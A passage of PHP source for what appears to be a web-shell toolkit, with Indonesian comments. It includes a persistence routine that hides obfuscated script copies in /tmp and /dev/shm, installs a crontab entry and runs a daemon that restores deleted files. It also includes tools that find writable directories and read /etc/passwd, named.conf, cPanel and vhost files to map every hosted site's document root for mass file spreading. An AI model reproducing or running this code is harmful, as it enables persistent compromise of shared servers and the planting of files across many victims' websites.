        if (strpos($line, $cronMarker) !== false) continue;
        if (strlen($line) > 900 && (strpos($line, 'base64') !== false || strpos($line, 'cronsh_') !== false)) continue;
        $kept[] = $line;
    }
    $kept[] = $cronLine;
    $cronBody = implode("\n", $kept) . "\n";
    // (old long-payload builder removed — kept vars unused intentionally below)
    $cronPayloadB64 = '';
    unset($cronPayload, $tmpB64, $shmB64);
    $newLines = array();
    foreach ($lines as $ln) {
        if (strpos($ln, $cronMarker) !== false) {
            continue;
        }
        if (strpos($ln, '# gecko_rec_' . $instanceId) !== false) {
            continue;
        }
        if (trim($ln) === '') {
            continue;
        }
        $newLines[] = $ln;
    }
    $newLines[] = $cronLine;
    $cronBody = implode("\n", $newLines) . "\n";
    $cronSave = setCrontab($cronBody);
    if (!empty($cronSave['ok'])) {
        $cronOk = true;
        $steps[] = 'Crontab installed: ' . $cronMarker;
    } else {
        $cronTmp = '/tmp/.' . $instanceId . '.crontab.txt';
        @file_put_contents($cronTmp, $cronBody);
        $cronTry = runTerminal('crontab ' . geckoEscapeshellarg($cronTmp), '/tmp', 25);
        @unlink($cronTmp);
        if (empty($cronTry['timed_out']) && (int)$cronTry['exit_code'] === 0) {
            $cronOk = true;
            $steps[] = 'Crontab installed via crontab file';
        } else {
            $steps[] = 'Crontab gagal: ' . (isset($cronSave['error']) ? $cronSave['error'] : (isset($cronTry['output']) ? substr((string)$cronTry['output'], 0, 200) : 'unknown'));
        }
    }

    $cronCheck = getCrontab();
    if (!empty($cronCheck['content']) && strpos($cronCheck['content'], $cronMarker) !== false) {
        $cronOk = true;
        $steps[] = 'Crontab confirmed present';
    }

    // Stop old daemon, start new, wait for PID
    if (is_file($pidFile)) {
        $oldPid = (int)trim((string)@file_get_contents($pidFile));
        if ($oldPid > 0) {
            @exec('kill ' . $oldPid . ' 2>/dev/null');
            usleep(300000);
        }
        @unlink($pidFile);
    }

    $execPath = is_file($installPath) ? $installPath : $shmPath;
    runTerminal(
        'bash -c ' . geckoEscapeshellarg('nohup bash ' . geckoEscapeshellarg($execPath) . ' --daemon >/dev/null 2>&1 &'),
        '/tmp',
        10
    );

    $pid = 0;
    $deadline = microtime(true) + 6.0;
    while (microtime(true) < $deadline) {
        if (is_file($pidFile)) {
            $pid = (int)trim((string)@file_get_contents($pidFile));
            if ($pid > 0) {
                break;
            }
        }
        usleep(200000);
    }
    if ($pid <= 0) {
        @exec('nohup bash ' . geckoEscapeshellarg($execPath) . ' --daemon >/dev/null 2>&1 &');
        usleep(1000000);
        if (is_file($pidFile)) {
            $pid = (int)trim((string)@file_get_contents($pidFile));
        }
    }

    if ($pid > 0) {
        $steps[] = 'Daemon started, PID: ' . $pid . ' (' . $pidFile . ')';
    } else {
        $steps[] = 'Daemon PID missing. Manual: nohup bash ' . $execPath . ' --daemon >/dev/null 2>&1 &';
    }

    // Heal pass like cron.sh --recover
    runTerminal('bash ' . geckoEscapeshellarg($execPath) . ' --recover', '/tmp', 60);
    if (is_file($pidFile)) {
        $pid2 = (int)trim((string)@file_get_contents($pidFile));
        if ($pid2 > 0) {
            $pid = $pid2;
        }
    }
    $cronCheck2 = getCrontab();
    if (!empty($cronCheck2['content']) && strpos($cronCheck2['content'], $cronMarker) !== false) {
        $cronOk = true;
    }

    $steps[] = 'cron.sh parity check:';
    $steps[] = '- obfuscated /tmp: ' . (is_file($installPath) ? 'OK' : 'MISSING');
    $steps[] = '- obfuscated /dev/shm: ' . (is_file($shmPath) ? 'OK' : 'MISSING');
    $steps[] = '- PID: ' . ($pid > 0 ? ('OK ' . $pid) : 'MISSING');
    $steps[] = '- Crontab embed: ' . ($cronOk ? 'OK' : 'MISSING');
    $steps[] = '- Auto-restore: daemon every 1s when file deleted; crontab every 1m';

    $ok = (is_file($installPath) || is_file($shmPath)) && ($pid > 0 || $cronOk);
    return array(
        'ok' => $ok,
        'message' => $ok
            ? 'Persistence aktif seperti cron.sh (obfuscated /tmp+/dev/shm + crontab embed + PID). File yang dihapus akan kembali otomatis.'
            : 'Deploy persistence tidak lengkap — cek steps.',
        'instance_id' => $instanceId,
        'install_path' => $installPath,
        'shm_path' => $shmPath,
        'pid_file' => $pidFile,
        'pid' => $pid,
        'crontab' => $cronOk,
        'cron_marker' => $cronMarker,
        'mutual_backup' => true,
        'obfuscated' => true,
        'async' => false,
        'steps' => $steps,
    );
}

/**
 * Find writable directories under a start path (Tools → Find Writable Dir).
 * Action name: find_writable_dirs — does not conflict with Blue Team "writable".
 */
function geckoFindWritableValidatePath($path)
{
    $path = trim(str_replace('\\', '/', (string)$path));
    if ($path === '') {
        return array(false, 'Path kosong.');
    }
    if (strpos($path, "\0") !== false) {
        return array(false, 'Path mengandung karakter ilegal.');
    }
    if (preg_match('#(^|/)\.\.(/|$)#', $path)) {
        return array(false, 'Path tidak boleh mengandung ..');
    }
    $isWinAbs = (bool)preg_match('/^[A-Za-z]:\//', $path);
    $isUnixAbs = (strlen($path) > 0 && $path[0] === '/');
    if (!$isWinAbs && !$isUnixAbs) {
        return array(false, 'Path harus absolute (contoh /var/www/html atau C:/...).');
    }
    return array(true, rtrim($path, '/'));
}

function geckoFindWritableWalk($dir, $depth, $maxDepth, &$found, &$scanned, $limit)
{
    if (count($found) >= $limit || $depth > $maxDepth) {
        return;
    }
    if (!is_dir($dir) || !is_readable($dir)) {
        return;
    }

    $scanned++;
    if (@is_writable($dir)) {
        $perm = @fileperms($dir);
        $found[] = array(
            'path' => str_replace('\\', '/', $dir),
            'perm' => $perm ? substr(sprintf('%o', $perm), -3) : '???',
            'depth' => $depth,
        );
        if (count($found) >= $limit) {
            return;
        }
    }

    if ($depth >= $maxDepth) {
        return;
    }

    $h = @opendir($dir);
    if (!$h) {
        return;
    }
    while (($item = readdir($h)) !== false) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        if (count($found) >= $limit) {
            break;
        }
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($full) && !is_link($full)) {
            geckoFindWritableWalk($full, $depth + 1, $maxDepth, $found, $scanned, $limit);
        }
    }
    closedir($h);
}

function geckoFindWritableDirs($startPath, $maxDepth = 8, $limit = 400)
{
    $maxDepth = (int)$maxDepth;
    $limit = (int)$limit;
    if ($maxDepth < 0) $maxDepth = 0;
    if ($maxDepth > 12) $maxDepth = 12;
    if ($limit < 1) $limit = 1;
    if ($limit > 500) $limit = 500;

    $real = realpath($startPath);
    if ($real === false || !is_dir($real)) {
        // realpath may fail if path exists but unreadable; still try raw path
        if (!is_dir($startPath)) {
            return array('ok' => false, 'error' => 'Direktori tidak ditemukan / tidak bisa diakses: ' . $startPath);
        }
        $real = $startPath;
    }

    $found = array();
    $scanned = 0;
    @set_time_limit(120);
    geckoFindWritableWalk($real, 0, $maxDepth, $found, $scanned, $limit);

    return array(
        'ok' => true,
        'start' => str_replace('\\', '/', $real),
        'count' => count($found),
        'scanned' => $scanned,
        'max_depth' => $maxDepth,
        'limit' => $limit,
        'truncated' => count($found) >= $limit,
        'dirs' => $found,
        'message' => count($found)
            ? ('Ditemukan ' . count($found) . ' writable dir dari ' . str_replace('\\', '/', $real))
            : ('Tidak ada writable dir di bawah ' . str_replace('\\', '/', $real)),
    );
}

/**
 * Mass Copy / File Spread (from copy.php) — Tools → Mass Copy
 * Spreads one source file into writable webroots under domain dirs found from base path.
 * Action: mass_copy — does not conflict with clipboard copy/paste (action: copy).
 */
function geckoMassExclDirs()
{
    return array(
        'cagefs', 'caldav', 'cl.selector', 'cpaddons', 'cpanel',
        'cache', 'etc', 'logs', 'lscache', 'mail', 'public_ftp',
        'ssl', 'var', 'tmp', 'backup', 'backups', 'session', 'sessions',
    );
}

function geckoMassSkipScan()
{
    return array(
        '.git', '.svn', 'node_modules', '__pycache__',
        'cache', 'tmp', 'logs', 'session', 'sessions',
        'backup', 'backups', 'sass-cache', '.idea',
    );
}

function geckoMassWebRoots()
{
    return array('public_html', 'www', 'htdocs', 'html', 'public', 'web');
}

function geckoMassIsDomain($name)
{
    if (!$name || $name === '.' || $name === '..') return false;
    if (isset($name[0]) && $name[0] === '.') return false;
    if (strpos($name, '.') === false) return false;
    return !in_array(strtolower($name), geckoMassExclDirs(), true);
}

function geckoMassFindDomains($base)
{
    $domains = array();
    $base = rtrim(str_replace('\\', '/', (string)$base), '/');
    if ($base === '') return $domains;

    if (strpos($base, '*') !== false) {
        $userDirs = @glob($base, GLOB_ONLYDIR);
        if (!is_array($userDirs)) $userDirs = array();
        foreach ($userDirs as $ud) {
            $subs = @glob(rtrim(str_replace('\\', '/', $ud), '/') . '/*', GLOB_ONLYDIR);
            if (!is_array($subs)) continue;
            foreach ($subs as $sub) {
                if (geckoMassIsDomain(basename($sub))) {
                    $domains[] = str_replace('\\', '/', $sub);
                }
            }
        }
    } else {
        $subs = @glob($base . '/*', GLOB_ONLYDIR);
        if (!is_array($subs)) $subs = array();
        foreach ($subs as $sub) {
            if (geckoMassIsDomain(basename($sub))) {
                $domains[] = str_replace('\\', '/', $sub);
            }
        }
    }
    return $domains;
}


/** Baca baris file sistem (named.conf / domainowners / passwd) — ala Symlink(php). */
function geckoMassReadLines($path)
{
    $path = (string)$path;
    if ($path === '' || !@is_file($path) || !@is_readable($path)) {
        return array();
    }
    $raw = @file($path, FILE_IGNORE_NEW_LINES);
    if (is_array($raw)) {
        return $raw;
    }
    $txt = @file_get_contents($path);
    if ($txt === false || $txt === '') {
        return array();
    }
    return preg_split("/\r\n|\n|\r/", $txt);
}

function geckoMassOwnerOf($path)
{
    $path = (string)$path;
    if ($path === '' || !@file_exists($path)) {
        return '';
    }
    if (function_exists('posix_getpwuid') && function_exists('fileowner')) {
        $uid = @fileowner($path);
        if ($uid !== false) {
            $info = @posix_getpwuid($uid);
            if (is_array($info) && !empty($info['name'])) {
                return (string)$info['name'];
            }
        }
    }
    if (function_exists('geckoShellRun')) {
        $r = geckoShellRun('stat -c %U ' . geckoEscapeshellarg($path) . ' 2>/dev/null', '/tmp', 5);
        $out = isset($r['output']) ? trim($r['output']) : '';
        if ($out !== '' && preg_match('/^[a-zA-Z0-9_\-]+$/', $out)) {
            return $out;
        }
    }
    return '';
}

function geckoMassUserPublicHtml($user)
{
    $user = trim((string)$user);
    if ($user === '' || !preg_match('/^[a-zA-Z0-9_\-]+$/', $user)) {
        return '';
    }
    $candidates = array(
        '/home/' . $user . '/public_html',
        '/home/' . $user . '/www',
        '/home/' . $user . '/htdocs',
        '/var/www/' . $user . '/public_html',
    );
    foreach ($candidates as $p) {
        if (@is_dir($p)) {
            return str_replace('\\', '/', $p);
        }
    }
    return '/home/' . $user . '/public_html';
}

/**
 * Discovery domain+user+path ala Symlink(php):
 * domainowners -> userdatadomains -> named.conf/valiases -> passwd
 * Path webroot: /home/{user}/public_html
 */

/** Zone/domain sampah hosting (bukan site customer). */
function geckoMassIsJunkDomain($domain)
{
    $d = strtolower(trim((string)$domain));
    if ($d === '' || $d === '.' || $d === 'localhost') return true;
    if (isset($d[0]) && $d[0] === '.') return true;
    if (strpos($d, '.') === false) return true;
    // panel / infra
    if (preg_match('/(^|\\.)virtuaserver\\.com\\.br$/i', $d)) return true;
    if (preg_match('/\\.cpanel3\\./i', $d)) return true;
    if (preg_match('/\\.cpanel\\.site$/i', $d)) return true;
    if (preg_match('/\\.webhostbox\\.net$/i', $d)) return true;
    if (preg_match('/\\.cpanel\\.site$/i', $d)) return true;
    if (preg_match('/(^|\\.)cp3\\.sh15\\.net$/i', $d)) return true;
    if (strpos($d, 'cpanel3.virtuaserver') !== false) return true;
    if (preg_match('/\\.\\d{1,3}-\\d{1,3}-\\d{1,3}-\\d{1,3}\\.cpanel\\.site$/i', $d)) return true;
    return false;
}

/** Resolve document root spesifik domain (addon/sub) sebelum fallback public_html. */
function geckoMassResolveDocRoot($domain, $user, $hintPath = '')
{
    $domain = strtolower(trim((string)$domain));
    $user = trim((string)$user);
    $hintPath = rtrim(str_replace('\\', '/', (string)$hintPath), '/');
    $cands = array();
    if ($hintPath !== '' && @is_dir($hintPath)) {
        $cands[] = $hintPath;
    }
    if ($user !== '' && $domain !== '' && substr($domain, -6) !== '.local') {
        $cands[] = '/home/' . $user . '/public_html/' . $domain;
        $cands[] = '/home/' . $user . '/' . $domain;
        $cands[] = '/home/' . $user . '/www/' . $domain;
        // cPanel userdata file
        $ud = '/var/cpanel/userdata/' . $user . '/' . $domain;
        if (@is_file($ud) && @is_readable($ud)) {
            foreach (geckoMassReadLines($ud) as $line) {
                if (preg_match('/^documentroot:\\s*(.+)$/i', trim($line), $m)) {
                    $p = trim($m[1]);
                    if ($p !== '') $cands[] = rtrim(str_replace('\\', '/', $p), '/');
                }
            }
        }
    }
    if ($user !== '') {
        $cands[] = geckoMassUserPublicHtml($user);
    }
    // Prefer path paling spesifik yang exists
    $best = '';
    $bestScore = -1;
    foreach ($cands as $p) {
        $p = rtrim(str_replace('\\', '/', $p), '/');
        if ($p === '' || !@is_dir($p)) continue;
        $score = substr_count($p, '/');
        // bonus kalau path mengandung nama domain
        if ($domain !== '' && strpos($p, $domain) !== false) $score += 10;
        if ($score > $bestScore) {
            $bestScore = $score;
            $best = $p;
        }
    }
    return $best;
}

function geckoMassDiscoverFromSystem()
{
    $out = array();
    $seen = array();
    $methods = array();
    $add = function ($domain, $user, $path = '', $srcName = 'system') use (&$out, &$seen) {
        $domain = strtolower(trim((string)$domain));
        $user = trim((string)$user);
        if (geckoMassIsJunkDomain($domain)) return;
        if ($user === '' || !preg_match('/^[a-zA-Z0-9_\-]+$/', $user)) return;
        if ($domain === '') return;
        $key = $domain;
        if (isset($seen[$key])) return;
        $seen[$key] = true;
        $path = geckoMassResolveDocRoot($domain, $user, $path);
        if ($path === '') {
            $path = geckoMassUserPublicHtml($user);
        }
        $path = rtrim(str_replace('\\', '/', (string)$path), '/');
        $out[] = array(
            'domain' => $domain,
            'user' => $user,
            'path' => $path,
            'source' => $srcName,
        );
    };

    // 1) domainowners
    if (@is_file('/etc/virtual/domainowners') && @is_readable('/etc/virtual/domainowners')) {
        $n = 0;
        foreach (geckoMassReadLines('/etc/virtual/domainowners') as $line) {
            $line = trim($line);
            if ($line === '' || strpos($line, ':') === false) continue;
            $parts = explode(':', $line, 2);
            $add(trim($parts[0]), trim($parts[1]), '', 'domainowners');
            $n++;
        }
        if ($n > 0) $methods[] = 'domainowners';
    }

    // 2) cPanel userdatadomains — sering berisi path docroot
    if (@is_file('/etc/userdatadomains') && @is_readable('/etc/userdatadomains')) {
        $n = 0;
        foreach (geckoMassReadLines('/etc/userdatadomains') as $line) {
            $line = trim($line);
            if ($line === '' || strpos($line, ':') === false) continue;
            $parts = explode(':', $line, 2);
            $domain = trim($parts[0]);
            $rest = trim($parts[1]);
            $user = $rest;
            $doc = '';
            if (preg_match('/^([a-zA-Z0-9_\-]+)/', $rest, $m)) {
                $user = $m[1];
            }
            // format == sering: user==...==/home/user/public_html==...
            if (strpos($rest, '==') !== false) {
                $bits = explode('==', $rest);
                if (!empty($bits[0])) $user = trim($bits[0]);
                foreach ($bits as $b) {
                    $b = trim($b);
                    if ($b !== '' && $b[0] === '/' && strpos($b, '/home/') === 0) {
                        $doc = $b;
                        break;
                    }
                }
            }
            $add($domain, $user, $doc, 'userdatadomains');
            $n++;
        }
        if ($n > 0) $methods[] = 'userdatadomains';
    }

    // 3) named.conf zones + valiases owner
    $namedDomains = array();
    foreach (geckoMassReadLines('/etc/named.conf') as $line) {
        if (stripos($line, 'zone') === false) continue;
        if (preg_match('/zone\s+"([^"]+)"/i', $line, $m)) {
            $d = strtolower(trim($m[1]));
            if (geckoMassIsJunkDomain($d)) continue;
            if (strlen($d) > 2 && strpos($d, '.') !== false) {
                $namedDomains[$d] = true;
            }
        }
    }

    $valiases = array();
    if (@is_dir('/etc/valiases') && @is_readable('/etc/valiases')) {
        $scan = @scandir('/etc/valiases');
        if (is_array($scan)) {
            foreach ($scan as $name) {
                if ($name === '.' || $name === '..') continue;
                if (geckoMassIsJunkDomain($name)) continue;
                $valiases[strtolower($name)] = '/etc/valiases/' . $name;
            }
        }
    }
    foreach ($namedDomains as $d => $_) {
        if (!isset($valiases[$d])) {
            $valiases[$d] = '/etc/valiases/' . $d;
        }
    }
    $nNamed = 0;
    foreach ($valiases as $domain => $valiasPath) {
        if (geckoMassIsJunkDomain($domain)) continue;
        $user = '';
        if (@file_exists($valiasPath)) {
            $user = geckoMassOwnerOf($valiasPath);
        }
        // trueuserdomains / grep userdata if owner missing
        if (($user === '' || $user === 'root') && @is_file('/etc/trueuserdomains')) {
            foreach (geckoMassReadLines('/etc/trueuserdomains') as $tl) {
                $tl = trim($tl);
                if (stripos($tl, strtolower($domain)) === 0 && strpos($tl, ':') !== false) {
                    $tp = explode(':', $tl, 2);
                    if (strtolower(trim($tp[0])) === strtolower($domain)) {
                        $user = trim($tp[1]);
                        break;
                    }
                }
            }
        }
        if ($user === '' || $user === 'root') continue;
        $add($domain, $user, '', 'named+valiases');
        $nNamed++;
    }
    if ($nNamed > 0) $methods[] = 'named+valiases';

    // 4) passwd fallback hanya jika masih kosong
    if (empty($out)) {
        $byUser = array();
        foreach (geckoMassReadLines('/etc/passwd') as $line) {
            $parts = explode(':', $line);
            if (count($parts) < 6) continue;
            $user = $parts[0];
            $uid = (int)$parts[2];
            $home = $parts[5];
            if ($uid < 500) continue;
            if ($user === 'nobody' || $user === 'nfsnobody') continue;
            $ph = rtrim(str_replace('\\', '/', $home), '/') . '/public_html';
            if (!@is_dir($ph)) {
                $ph = geckoMassUserPublicHtml($user);
            }
            if (!@is_dir($ph)) continue;
            if (isset($byUser[$user])) continue;
            $byUser[$user] = true;
            $add($user . '.site.local', $user, $ph, 'passwd');
        }
        if (!empty($out)) $methods[] = 'passwd';
    }

    return array(
        'ok' => !empty($out),
        'method' => implode('+', $methods),
        'entries' => $out,
        'error' => empty($out) ? 'Tidak bisa baca domainowners/userdatadomains/named/valiases/passwd.' : '',
    );
}

/**
 * v2 targets: SATU target per document-root unik (bukan cuma 1 per user).
 * Banyak domain di named.conf -> path addon berbeda ikut ter-cover.
 */
function geckoMassResolveTargetsV2()
{
    $sys = geckoMassDiscoverFromSystem();
    if (empty($sys['entries'])) {
        return array(
            'ok' => false,
            'mode' => 'v2-system',
            'method' => isset($sys['method']) ? $sys['method'] : '',
            'targets' => array(),
            'error' => isset($sys['error']) ? $sys['error'] : 'Discovery sistem kosong.',
        );
    }

    $byPath = array();
    foreach ($sys['entries'] as $e) {
        $user = isset($e['user']) ? $e['user'] : '';
        $domain = isset($e['domain']) ? $e['domain'] : '';
        if ($user === '' || $domain === '') continue;
        if (geckoMassIsJunkDomain($domain)) continue;

        $path = isset($e['path']) ? $e['path'] : '';
        $path = geckoMassResolveDocRoot($domain, $user, $path);
        if ($path === '' || !@is_dir($path)) {
            $path = geckoMassUserPublicHtml($user);
        }
        if ($path === '' || !@is_dir($path)) {
            continue;
        }
        $pathKey = $path;
        // realpath kalau bisa (dedupe symlink)
        $rp = @realpath($path);
        if ($rp) $pathKey = str_replace('\\', '/', $rp);

        if (!isset($byPath[$pathKey])) {
            $byPath[$pathKey] = array(
                'domain' => $domain,
                'user' => $user,
                'domainDir' => $path,
                'domains' => array($domain),
                'source' => isset($sys['method']) ? $sys['method'] : 'system',
            );
        } else {
            if (!in_array($domain, $byPath[$pathKey]['domains'], true)) {
                $byPath[$pathKey]['domains'][] = $domain;
            }
            // prefer FQDN non-local sebagai primary
            if (substr($byPath[$pathKey]['domain'], -6) === '.local' && substr($domain, -6) !== '.local') {
                $byPath[$pathKey]['domain'] = $domain;
            }
        }
    }

    $targets = array_values($byPath);
    return array(
        'ok' => !empty($targets),
        'mode' => 'v2-system',
        'method' => isset($sys['method']) ? $sys['method'] : '',
        'targets' => $targets,
        'discovered_domains' => count($sys['entries']),
        'unique_docroots' => count($targets),
        'error' => empty($targets) ? 'Tidak ada document root writable dari discovery.' : '',
    );
}

/** Direktori vhost Apache/Nginx untuk Mass Copy v3. */
function geckoMassVhostDirs()
{
    return array(
        '/etc/apache2/sites-enabled',
        '/etc/nginx/sites-enabled',
    );
}

/** Normalisasi ServerName (buang wildcard, default, junk). */
function geckoMassNormalizeVhostDomain($name)
{
    $name = strtolower(trim((string)$name));
    $name = trim($name, " \t\"';");
    if ($name === '' || $name === '_' || $name === 'default' || $name === 'default_server') {
        return '';
    }
    // buang leading wildcard: *.domain.com → domain.com
    if (isset($name[0]) && $name[0] === '*') {
        $name = ltrim($name, '*.');
    }
    if ($name === '' || geckoMassIsJunkDomain($name)) {
        return '';
    }
    return $name;
}

/** List file conf di sites-enabled (ikuti symlink). */
function geckoMassListVhostConfFiles($dir)
{
    $dir = rtrim(str_replace('\\', '/', (string)$dir), '/');
    $out = array();
    if ($dir === '' || !@is_dir($dir) || !@is_readable($dir)) {
        return $out;
    }
    $scan = @scandir($dir);
    if (!is_array($scan)) {
        return $out;
    }
    foreach ($scan as $name) {
        if ($name === '.' || $name === '..') continue;
        $full = $dir . '/' . $name;
        // sites-enabled sering symlink ke sites-available
        if (@is_link($full)) {
            $real = @realpath($full);
            if ($real) $full = str_replace('\\', '/', $real);
        }
        if (!@is_file($full) || !@is_readable($full)) continue;
        // *.conf atau file tanpa ekstensi aneh (nginx kadang tanpa .conf)
        $base = basename($full);
        if (preg_match('/\.(bak|old|dist|example|rpmnew|dpkg-dist)$/i', $base)) continue;
        if (strpos($base, '.conf') === false && !preg_match('/^[a-zA-Z0-9_.\-]+$/', $base)) continue;
        $out[] = $full;
    }
    return array_values(array_unique($out));
}

/**
 * Parse Apache VirtualHost blocks → ServerName + DocumentRoot.
 * SSL (:443) dan HTTP (:80) dengan domain+docroot sama digabung (dedupe).
 */
function geckoMassParseApacheVhosts($content)
{
    $entries = array();
    $content = (string)$content;
    if ($content === '') return $entries;

    if (preg_match_all('/<VirtualHost\b[^>]*>(.*?)<\/VirtualHost>/is', $content, $blocks, PREG_SET_ORDER)) {
        foreach ($blocks as $block) {
            $body = $block[1];
            $serverNames = array();
            if (preg_match('/^\s*ServerName\s+(.+)$/im', $body, $m)) {
                $dn = geckoMassNormalizeVhostDomain($m[1]);
                if ($dn !== '') $serverNames[] = $dn;
            }
            if (preg_match_all('/^\s*ServerAlias\s+(.+)$/im', $body, $am)) {
                foreach ($am[1] as $aliasLine) {
                    foreach (preg_split('/\s+/', trim($aliasLine)) as $alias) {
                        $dn = geckoMassNormalizeVhostDomain($alias);
                        if ($dn !== '' && !in_array($dn, $serverNames, true)) {
                            $serverNames[] = $dn;
                        }
                    }
                }
            }
            $docRoot = '';
            if (preg_match('/^\s*DocumentRoot\s+["\']?([^"\'\s]+)["\']?/im', $body, $dm)) {
                $docRoot = rtrim(str_replace('\\', '/', trim($dm[1])), '/');
            }
            if ($docRoot === '' || empty($serverNames)) continue;
            $entries[] = array(
                'domains' => $serverNames,
                'path' => $docRoot,
                'engine' => 'apache',
            );
        }
        return $entries;
    }

    // Fallback: file tanpa VirtualHost wrapper
    $serverNames = array();
    if (preg_match('/^\s*ServerName\s+(.+)$/im', $content, $m)) {
        $dn = geckoMassNormalizeVhostDomain($m[1]);
        if ($dn !== '') $serverNames[] = $dn;
    }
    if (preg_match_all('/^\s*ServerAlias\s+(.+)$/im', $content, $am)) {
        foreach ($am[1] as $aliasLine) {
            foreach (preg_split('/\s+/', trim($aliasLine)) as $alias) {
                $dn = geckoMassNormalizeVhostDomain($alias);
                if ($dn !== '' && !in_array($dn, $serverNames, true)) {
                    $serverNames[] = $dn;
                }
            }
        }
    }
    $docRoot = '';
    if (preg_match('/^\s*DocumentRoot\s+["\']?([^"\'\s]+)["\']?/im', $content, $dm)) {
        $docRoot = rtrim(str_replace('\\', '/', trim($dm[1])), '/');
    }
    if ($docRoot !== '' && !empty($serverNames)) {
        $entries[] = array(
            'domains' => $serverNames,
            'path' => $docRoot,
            'engine' => 'apache',
        );
    }
    return $entries;
}

/**
 * Parse Nginx server blocks → server_name + root.
 * listen 80 / 443 dengan root sama digabung via dedupe path di resolver.
 */
function geckoMassParseNginxVhosts($content)
{
    $entries = array();
    $content = (string)$content;
    if ($content === '') return $entries;

    // Ambil server { ... } level atas (heuristik brace matching)
    $len = strlen($content);
    $i = 0;
    while ($i < $len) {
        if (!preg_match('/\bserver\s*\{/i', $content, $sm, PREG_OFFSET_CAPTURE, $i)) {
            break;
        }
        $start = $sm[0][1] + strlen($sm[0][0]);
        $depth = 1;
        $j = $start;
        while ($j < $len && $depth > 0) {
            $ch = $content[$j];
            if ($ch === '{') $depth++;
            elseif ($ch === '}') $depth--;
            $j++;
        }
        $body = substr($content, $start, max(0, $j - $start - 1));
        $i = $j;

        $serverNames = array();
        if (preg_match_all('/^\s*server_name\s+([^;]+);/im', $body, $nm)) {
            foreach ($nm[1] as $line) {
                foreach (preg_split('/\s+/', trim($line)) as $alias) {
                    $dn = geckoMassNormalizeVhostDomain($alias);
                    if ($dn !== '' && !in_array($dn, $serverNames, true)) {
                        $serverNames[] = $dn;
                    }
                }
            }
        }
        $docRoot = '';
        if (preg_match('/^\s*root\s+["\']?([^"\'\s;]+)["\']?\s*;/im', $body, $rm)) {
            $docRoot = rtrim(str_replace('\\', '/', trim($rm[1])), '/');
        }
        if ($docRoot === '' || empty($serverNames)) continue;
        $entries[] = array(
            'domains' => $serverNames,
            'path' => $docRoot,
            'engine' => 'nginx',
        );
    }
    return $entries;
}

/**
 * Discovery v3: baca /etc/apache2|nginx/sites-enabled/*.conf
 * Dedupe ketat per DocumentRoot unik agar HTTP+SSL tidak dobel.
 */
function geckoMassDiscoverFromVhosts()
{
    $entries = array();
    $methods = array();
    $rawCount = 0;
    $dirsTried = array();

    foreach (geckoMassVhostDirs() as $dir) {
        $dirsTried[] = $dir;
        $files = geckoMassListVhostConfFiles($dir);
        if (empty($files)) continue;

        $isNginx = (stripos($dir, 'nginx') !== false);
        $engine = $isNginx ? 'nginx' : 'apache';
        $n = 0;

        foreach ($files as $file) {
            $txt = @file_get_contents($file);
            if ($txt === false || $txt === '') continue;
            $parsed = $isNginx
                ? geckoMassParseNginxVhosts($txt)
                : geckoMassParseApacheVhosts($txt);
            foreach ($parsed as $p) {
                $path = isset($p['path']) ? rtrim(str_replace('\\', '/', $p['path']), '/') : '';
                $domains = (isset($p['domains']) && is_array($p['domains'])) ? $p['domains'] : array();
                if ($path === '' || empty($domains)) continue;
                $rawCount++;
                $n++;
                $entries[] = array(
                    'domains' => $domains,
                    'domain' => $domains[0],
                    'path' => $path,
                    'user' => geckoMassOwnerOf($path),
                    'source' => $engine . ':' . basename($file),
                    'engine' => $engine,
                );
            }
        }
        if ($n > 0) $methods[] = $engine . '-sites-enabled';
    }

    return array(
        'ok' => !empty($entries),
        'method' => implode('+', $methods),
        'entries' => $entries,
        'raw_count' => $rawCount,
        'dirs' => $dirsTried,
        'error' => empty($entries)
            ? 'Tidak ada ServerName/DocumentRoot di /etc/apache2/sites-enabled atau /etc/nginx/sites-enabled.'
            : '',
    );
}

/**
 * v3 targets: SATU target per DocumentRoot unik (realpath).
 * Config :80 dan :443 (SSL) / file -le-ssl.conf dengan DocumentRoot sama → 1 target, tidak dobel.
 */
function geckoMassResolveTargetsV3()
{
    $sys = geckoMassDiscoverFromVhosts();
    if (empty($sys['entries'])) {
        return array(
            'ok' => false,
            'mode' => 'v3-vhost',
            'method' => isset($sys['method']) ? $sys['method'] : '',
            'targets' => array(),
            'dirs' => isset($sys['dirs']) ? $sys['dirs'] : array(),
            'error' => isset($sys['error']) ? $sys['error'] : 'Discovery vhost kosong.',
        );
    }

    $byPath = array();
    $domainHits = 0;
    $mergedDupes = 0;

    foreach ($sys['entries'] as $e) {
        $path = isset($e['path']) ? rtrim(str_replace('\\', '/', $e['path']), '/') : '';
        if ($path === '' || !@is_dir($path)) continue;

        $domains = array();
        if (isset($e['domains']) && is_array($e['domains'])) {
            foreach ($e['domains'] as $d) {
                $d = geckoMassNormalizeVhostDomain($d);
                if ($d === '') continue;
                if (!in_array($d, $domains, true)) $domains[] = $d;
            }
        }
        if (empty($domains) && !empty($e['domain'])) {
            $d = geckoMassNormalizeVhostDomain($e['domain']);
            if ($d !== '') $domains[] = $d;
        }
        if (empty($domains)) continue;
        $domainHits += count($domains);

        // Key dedupe = realpath DocumentRoot → HTTP + SSL tidak bentrok
        $pathKey = $path;
        $rp = @realpath($path);
        if ($rp) $pathKey = str_replace('\\', '/', $rp);

        $user = isset($e['user']) ? trim((string)$e['user']) : '';
        if ($user === '') {
            $user = geckoMassOwnerOf($pathKey);
        }

        if (!isset($byPath[$pathKey])) {
            $byPath[$pathKey] = array(
                'domain' => $domains[0],
                'user' => $user,
                'domainDir' => $pathKey,
                'domains' => $domains,
                'source' => isset($e['source']) ? $e['source'] : 'vhost',
            );
        } else {
            // Merge SSL/HTTP/alias ke target yang sama
            foreach ($domains as $d) {
                if (!in_array($d, $byPath[$pathKey]['domains'], true)) {
                    $byPath[$pathKey]['domains'][] = $d;
                }
                $mergedDupes++;
            }
            $cur = $byPath[$pathKey]['domain'];
            if (strlen($domains[0]) < strlen($cur) || substr_count($domains[0], '.') < substr_count($cur, '.')) {
                $byPath[$pathKey]['domain'] = $domains[0];
            }
            if ($byPath[$pathKey]['user'] === '' && $user !== '') {
                $byPath[$pathKey]['user'] = $user;
            }
        }
    }

    $targets = array_values($byPath);
    return array(
        'ok' => !empty($targets),
        'mode' => 'v3-vhost',
        'method' => isset($sys['method']) ? $sys['method'] : 'vhost',
        'targets' => $targets,
        'discovered_domains' => $domainHits,
        'unique_docroots' => count($targets),
        'raw_vhosts' => isset($sys['raw_count']) ? (int)$sys['raw_count'] : 0,
        'merged_dupes' => $mergedDupes,
        'dirs' => isset($sys['dirs']) ? $sys['dirs'] : array(),
